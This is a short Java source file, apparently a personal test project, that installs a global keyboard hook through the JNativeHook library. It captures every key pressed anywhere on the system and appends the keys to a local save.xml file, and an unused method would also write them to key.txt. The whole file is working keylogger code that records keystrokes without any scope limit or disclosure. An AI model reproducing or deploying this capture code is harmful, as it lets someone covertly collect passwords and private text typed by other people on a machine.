/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package testkey;

import java.io.File;
import java.io.FileOutputStream;
import java.io.FileWriter;
import java.io.IOException;
import java.util.Iterator;
import java.util.List;
import java.util.logging.Level;
import java.util.logging.Logger;
import org.jdom2.Document;
import org.jdom2.Element;
import org.jdom2.JDOMException;
import org.jdom2.input.SAXBuilder;
import org.jdom2.output.Format;
import org.jdom2.output.XMLOutputter;
import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

/**
 *
 * @author kingdragon
 */
public class TestKey implements NativeKeyListener{

    /**
     * @param args the command line arguments
     */
    public static void main(String[] args) throws NativeHookException {
        GlobalScreen.registerNativeHook();
        GlobalScreen.getInstance().addNativeKeyListener(new TestKey());
        
        
    }

    @Override
    public void nativeKeyPressed(NativeKeyEvent e) {
       
        System.out.println(NativeKeyEvent.getKeyText(e.getKeyCode()));
        try {
            try {
                Enregistrer(NativeKeyEvent.getKeyText(e.getKeyCode()));
            } catch (JDOMException ex) {
                Logger.getLogger(TestKey.class.getName()).log(Level.SEVERE, null, ex);
            }
        } catch (IOException ex) {
            Logger.getLogger(TestKey.class.getName()).log(Level.SEVERE, null, ex);
        }
    }

    @Override
    public void nativeKeyReleased(NativeKeyEvent nke) {
        
    }

    @Override
    public void nativeKeyTyped(NativeKeyEvent nke) {
       
    }
    
    private void Enregistrer(String element) throws JDOMException, IOException
    {
        SAXBuilder sax= new SAXBuilder();
        Document doc=sax.build(new File("save.xml"));
        Element racine = doc.getRootElement();
        Element elm = new Element("Object");
         List l =racine.getChildren();
         Iterator i=l.iterator();
         
         while(i.hasNext())
         {
             elm= (Element) i.next();
              elm.setText(elm.getText()+element) ;
             
         }
         XMLOutputter sortie = new XMLOutputter(Format.getPrettyFormat());
         sortie.output(doc, new FileOutputStream("save.xml"));
        
    }
    
    
    
    public void Enregistrer2(String str) throws IOException
    {
        File file = new File("key.txt");
        
        FileWriter w = new FileWriter(file, true);
        char  ch[]=str.toCharArray();
        for (char c : ch) {
             w.append(c);
        }
       
        w.close();
       
    }
    
}
